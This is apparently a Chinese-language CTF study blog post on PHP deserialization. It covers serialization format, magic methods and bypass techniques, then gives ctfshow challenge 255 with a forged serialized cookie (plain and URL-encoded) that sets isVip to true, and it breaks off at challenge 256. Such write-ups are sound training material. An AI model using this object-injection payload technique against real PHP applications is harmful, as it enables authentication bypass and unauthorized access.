<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="&amp;#x53CD;&amp;#x5E8F;&amp;#x5217;&amp;#x5316;">
<meta property="og:type" content="article">
<meta property="og:title" content="7.3">
<meta property="og:url" content="http://example.com/2022/07/30/7-30/index.html">
<meta property="og:site_name" content="Clutter Box">
<meta property="og:description" content="&amp;#x53CD;&amp;#x5E8F;&amp;#x5217;&amp;#x5316;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2022/07/30/7-30/7-30/1661441783175.png">
<meta property="og:image" content="http://example.com/2022/07/30/7-30/7-30/1661442535375.png">
<meta property="og:image" content="http://example.com/2022/07/30/7-30/7-30/1660036245365.png">
<meta property="og:image" content="http://example.com/2022/07/30/7-30/7-30/1660036907507.png">
<meta property="og:image" content="http://example.com/2022/07/30/7-30/7-30/1661185697137.png">
<meta property="og:image" content="http://example.com/2022/07/30/7-30/7-30/1661268623252.png">
<meta property="article:published_time" content="2022-07-30T02:59:58.000Z">
<meta property="article:modified_time" content="2023-06-05T03:01:25.729Z">
<meta property="article:author" content="Kirsten Carton">
<meta property="article:tag" content="反序列化，ctfshow">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2022/07/30/7-30/7-30/1661441783175.png"><title>7.3 | Clutter Box</title><link ref="canonical" href="http://example.com/2022/07/30/7-30/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><script src="https://www.googletagmanager.com/gtag/js?id=G-Q0LPD8MD2C" async=""></script><script>if (window.location.hostname !== 'localhost') {
  window.dataLayer = window.dataLayer || [];
  function gtag(){ dataLayer.push(arguments); }
  gtag('js', new Date());
  gtag('config', 'G-Q0LPD8MD2C');
}</script><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clutter Box</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">7.3</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-07-30</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-06-05</span></span></div></header><div class="post-body">
        <h1 id="&#x53CD;&#x5E8F;&#x5217;&#x5316;">
          <a href="#&#x53CD;&#x5E8F;&#x5217;&#x5316;" class="heading-link"><i class="fas fa-link"></i></a><a href="#&#x53CD;&#x5E8F;&#x5217;&#x5316;" class="headerlink" title="&#x53CD;&#x5E8F;&#x5217;&#x5316;"></a>&#x53CD;&#x5E8F;&#x5217;&#x5316;</h1>
      <span id="more"></span>

<p>&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x6709;&#x7528;&#x7684;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x535A;&#x5BA2;</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://v0w.top/2020/03/05/unsearise-POP/#1-3-%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%BD%A2%E5%BC%8F">php&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x4E0E;POP&#x94FE; | V0W&#x2019;s Blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11403397.html">CTF PHP&#x53CD;&#x5E8F;&#x5217;&#x5316; - MustaphaMond - &#x535A;&#x5BA2;&#x56ED; (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/bylfsj/article/details/105021121?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1-105021121-blog-119301788.pc_relevant_multi_platform_whitelistv1&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1-105021121-blog-119301788.pc_relevant_multi_platform_whitelistv1&amp;utm_relevant_index=1">(1&#x6761;&#x6D88;&#x606F;) &#x539F;&#x7406;+&#x5B9E;&#x8DF5;&#x638C;&#x63E1;(PHP&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x548C;Session&#x53CD;&#x5E8F;&#x5217;&#x5316;)_bylfsj&#x7684;&#x535A;&#x5BA2;-CSDN&#x535A;&#x5BA2;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>&#x6587;&#x7AE0;&#x5728;&#x8FD9;&#x91CC;&#x5566;&#xFF01;&#x5FEB;&#x53BB;&#x770B;&#x5B8C;&#xFF0C;&#x7136;&#x540E;&#x81EA;&#x5DF1;&#x64CD;&#x4F5C;&#x64CD;&#x4F5C;&#x5427;</p>
<hr>
<p>php&#x524D;&#x7F6E;&#x77E5;&#x8BC6;</p>
<p>&#x5B9E;&#x4F8B;&#x5316;&#x4E00;&#x4E2A;&#x7C7B;&#x540E;&#xFF0C;&#x518D;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x7C7B;&#x9700;&#x8981;&#x7528;&#x5230;<code>$this </code>&#x8FD9;&#x4E2A;&#x7279;&#x6B8A;&#x53D8;&#x91CF;&#xFF0C;&#x4EE3;&#x8868;&#x81EA;&#x5DF1;</p>
<hr>
<p>B&#x7AD9;&#x667A;&#x6167;&#x5C11;&#x5E74;Xenny&#x7684;&#x89C6;&#x9891;</p>
<p><strong>&#x524D;&#x9762;&#x6709;&#x524D;&#x7F00;</strong>&#x7684;&#x7C7B;</p>
<p>public </p>
<p>private %00%00</p>
<p>protected %00*%00</p>
<p>&#x597D;&#x7684;&#xFF0C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x540E;&#x7684;&#x952E;&#x503C;&#x5BF9;&#x7684;&#x5143;&#x7D20;&#x662F;&#xFF1A;</p>
<p>o:1{i:1s:2&#x201D;le&#x201D;}</p>
<p><strong>&#x9B54;&#x672F;&#x65B9;&#x6CD5;</strong></p>
<p>__wakeup</p>
<p>&#x5E8F;&#x5217;&#x5316;&#x7684;&#x6570;&#x5B57;&#x5927;&#x4E8E;&#x539F;&#x6765;&#x7684;&#x6570;&#x5B57;&#xFF0C;&#x53EF;&#x4EE5;&#x7ED5;&#x8FC7;</p>
<p><strong>pop&#x94FE;&#x6784;&#x9020;</strong></p>
<p>setstub</p>
<p>setMetadata</p>
<p><strong>phar://&#x7ED5;&#x8FC7;</strong></p>
<p>&#x5B57;&#x7B26;&#x4E32;&#x9003;&#x9038;&#xFF0C;&#x6839;&#x636E;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x89C4;&#x5B9A;&#x7684;&#x957F;&#x5EA6;&#x6765;&#x7ED5;&#x8FC7;</p>
<p>&#x53EF;&#x4EE5;&#x7528;preg_replace,&#x5C06;&#x89C4;&#x5B9A;&#x957F;&#x5EA6;&#x586B;&#x6EE1;&#x8FBE;&#x5230;&#x95ED;&#x5408;;}&#x7B49;&#x7B26;&#x53F7;&#x7684;&#x4F5C;&#x7528;&#xFF0C;&#x5C06;flag&#x66FF;&#x6362;&#x4E3A;index&#xFF0C;&#x5B57;&#x7B26;&#x4E32;&#x6EA2;&#x51FA;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x540E;&#x9762;&#x81EA;&#x5DF1;&#x9700;&#x8981;&#x7684;&#x5B57;&#x7B26;&#x4E32;</p>
<p>&#x4E5F;&#x53EF;&#x4EE5;&#x7528;index&#x66FF;&#x6362;&#x4E3A;flag&#xFF0C;&#x5C06;&#x89C4;&#x5B9A;&#x957F;&#x5EA6;&#x7A7A;&#x51FA;&#x6765;&#xFF0C;&#x586B;&#x5165;&#x81EA;&#x5DF1;&#x9700;&#x8981;&#x7684;payload</p>
<hr>

        <h2 id="&#x524D;&#x7F6E;&#x77E5;&#x8BC6;">
          <a href="#&#x524D;&#x7F6E;&#x77E5;&#x8BC6;" class="heading-link"><i class="fas fa-link"></i></a><a href="#&#x524D;&#x7F6E;&#x77E5;&#x8BC6;" class="headerlink" title="&#x524D;&#x7F6E;&#x77E5;&#x8BC6;"></a>&#x524D;&#x7F6E;&#x77E5;&#x8BC6;</h2>
      <p><strong>private&#x53D8;&#x91CF;&#x4F1A;&#x88AB;&#x5E8F;&#x5217;&#x5316;&#x4E3A;&#xFF1A;\x00&#x7C7B;&#x540D;\x00&#x53D8;&#x91CF;&#x540D;</strong></p>
<p><strong>protected&#x53D8;&#x91CF;&#x4F1A;&#x88AB;&#x5E8F;&#x5217;&#x5316;&#x4E3A;: \x00*\x00&#x53D8;&#x91CF;&#x540D;</strong></p>
<p><strong>public&#x53D8;&#x91CF;&#x4F1A;&#x88AB;&#x5E8F;&#x5217;&#x5316;&#x4E3A;&#xFF1A;&#x53D8;&#x91CF;&#x540D;</strong></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x7C7B;&#x578B;:d			-&gt;d&#x4EE3;&#x8868;&#x4E00;&#x4E2A;&#x6574;&#x578B;&#x6570;&#x5B57;</span><br><span class="line">O:d	-&gt;	&#x5BF9;&#x8C61;		-&gt;d&#x4EE3;&#x8868;&#x8BE5;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;&#x7684;&#x957F;&#x5EA6;,&#x4F8B;&#x5982;&#x4E0A;&#x8FF0;&#x7684;azhe&#x7C7B;&#x5BF9;&#x8C61;&#x957F;&#x5EA6;&#x4E3A;<span class="number">4</span>&#xFF0C;&#x539F;&#x751F;&#x7C7B;&#x5BF9;&#x8C61;<span class="built_in">Error</span>&#x957F;&#x5EA6;&#x4E3A;<span class="number">5</span></span><br><span class="line">a:d	-&gt;	&#x6570;&#x7EC4;		-&gt;d&#x4EE3;&#x8868;&#x6570;&#x7EC4;&#x5185;&#x90E8;&#x5143;&#x7D20;&#x6570;&#x91CF;&#xFF0C;&#x4F8B;&#x5982;<span class="keyword">array</span>(<span class="string">&apos;a&apos;</span>=&gt;<span class="string">&apos;b&apos;</span>,<span class="string">&apos;x&apos;</span>=&gt;<span class="number">1</span>)&#x6709;&#x4E24;&#x4E2A;&#x5143;&#x7D20;</span><br><span class="line">s:d	-&gt;	&#x5B57;&#x7B26;&#x4E32;		-dN&#x4EE3;&#x8868;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;,&#x4F8B;&#x5982;abc&#x5E8F;&#x5217;&#x5316;&#x540E;&#x4E3A;s:<span class="number">3</span>:<span class="string">&quot;abc&quot;</span>;</span><br><span class="line">i:d	-&gt;	&#x6574;&#x578B;		-&gt;d&#x4EE3;&#x8868;&#x6574;&#x578B;&#x53D8;&#x91CF;&#x7684;&#x503C;,&#x4F8B;&#x5982;<span class="number">300</span>&#x5E8F;&#x5217;&#x5316;&#x540E;&#x7684;&#x503C;&#x5219;&#x4E3A;i:<span class="number">300</span>;</span><br><span class="line"></span><br><span class="line">a - <span class="keyword">array</span></span><br><span class="line">b - <span class="keyword">boolean</span></span><br><span class="line">d - <span class="keyword">double</span></span><br><span class="line">i - <span class="keyword">integer</span></span><br><span class="line">o - common <span class="keyword">object</span></span><br><span class="line">r - reference</span><br><span class="line">s - <span class="keyword">string</span></span><br><span class="line">C - custom <span class="keyword">object</span></span><br><span class="line">O - <span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">N</span> - <span class="title">null</span></span></span><br><span class="line"><span class="class"><span class="title">R</span> - <span class="title">pointer</span> <span class="title">reference</span></span></span><br><span class="line"><span class="class"><span class="title">U</span> - <span class="title">unicode</span> <span class="title">string</span></span></span><br></pre></td></tr></table></div></figure>



<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__wakeup</span>() <span class="comment">//&#x4F7F;&#x7528;unserialize&#x65F6;&#x89E6;&#x53D1;</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>() <span class="comment">//&#x4F7F;&#x7528;serialize&#x65F6;&#x89E6;&#x53D1;</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>() <span class="comment">//&#x5BF9;&#x8C61;&#x88AB;&#x9500;&#x6BC1;&#x65F6;&#x89E6;&#x53D1;</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>() <span class="comment">//&#x5728;&#x5BF9;&#x8C61;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x8C03;&#x7528;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x65B9;&#x6CD5;&#x65F6;&#x89E6;&#x53D1;&#x2014;&#x2014;&#x5BF9;&#x8C61;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;&#x58F0;&#x660E;&#x7684;&#x65B9;&#x6CD5;&#x65F6;&#xFF0C;&#x89E6;&#x53D1;</span></span><br><span class="line"><span class="title function_ invoke__">__callStatic</span>() <span class="comment">//&#x5728;&#x9759;&#x6001;&#x4E0A;&#x4E0B;&#x6587;&#x4E2D;&#x8C03;&#x7528;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x65B9;&#x6CD5;&#x65F6;&#x89E6;&#x53D1;</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>() <span class="comment">//&#x7528;&#x4E8E;&#x4ECE;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x8BFB;&#x53D6;&#x6570;&#x636E;</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>() <span class="comment">//&#x7528;&#x4E8E;&#x5C06;&#x6570;&#x636E;&#x5199;&#x5165;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>() <span class="comment">//&#x5728;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x4E0A;&#x8C03;&#x7528;isset()&#x6216;empty()&#x89E6;&#x53D1;</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>() <span class="comment">//&#x5728;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x4E0A;&#x4F7F;&#x7528;unset()&#x65F6;&#x89E6;&#x53D1;</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>() <span class="comment">//&#x628A;&#x7C7B;&#x5F53;&#x4F5C;&#x5B57;&#x7B26;&#x4E32;&#x4F7F;&#x7528;&#x65F6;&#x89E6;&#x53D1;			echo &#x5BF9;&#x8C61;; $text=$test+$&#x5BF9;&#x8C61;&#xFF1B;</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>() <span class="comment">//&#x5F53;&#x811A;&#x672C;&#x5C1D;&#x8BD5;&#x5C06;&#x5BF9;&#x8C61;&#x8C03;&#x7528;&#x4E3A;&#x51FD;&#x6570;&#x65F6;&#x89E6;&#x53D1;&#xFF08;&#x5C1D;&#x8BD5;&#x4EE5;&#x51FD;&#x6570;&#x7684;&#x65B9;&#x5F0F;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#xFF09;</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>






        <h3 id="show">
          <a href="#show" class="heading-link"><i class="fas fa-link"></i></a><a href="#show" class="headerlink" title="show"></a>show</h3>
      
        <h3 id="255">
          <a href="#255" class="heading-link"><i class="fas fa-link"></i></a><a href="#255" class="headerlink" title="255"></a>255</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&apos;flag.php&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip){</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&apos;username&apos;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&apos;password&apos;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>)){</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&apos;user&apos;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>)){</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>()){</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        }</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>&#x4FEE;&#x6539;cookie&#xFF0C;cookie&#x7684;&#x503C;&#x4E3A;&#xFF1A;</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;ctfShowUser&quot;:3:{s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;s:5:&quot;isVip&quot;;b:1;}</span><br></pre></td></tr></table></div></figure>



<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></div></figure>




        <h3 id="256">
          <a href="#256" class="heading-link"><i class="fas fa-link"></i></a><a href="#256" class="headerlink" title="256"></a>256</h3>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&apos;flag.php&apos;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&apos;xxxxxx&apos;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip){</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password){</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              }</span><br><span class="line">        }<span class="keyword">else</span>{</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&apos;username&apos;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&apos;password&apos;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>)){</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&apos;user&apos;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>)){</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>()){</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        }</span><br><span class="line">    }<span class="keyword">else</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>

<p>&#x4E0E;255&#x4E0D;&#x540C;&#x7684;&#x5173;&#x952E;&#x4EE3;&#x7801;&#x662F;&#xFF1A;</p>
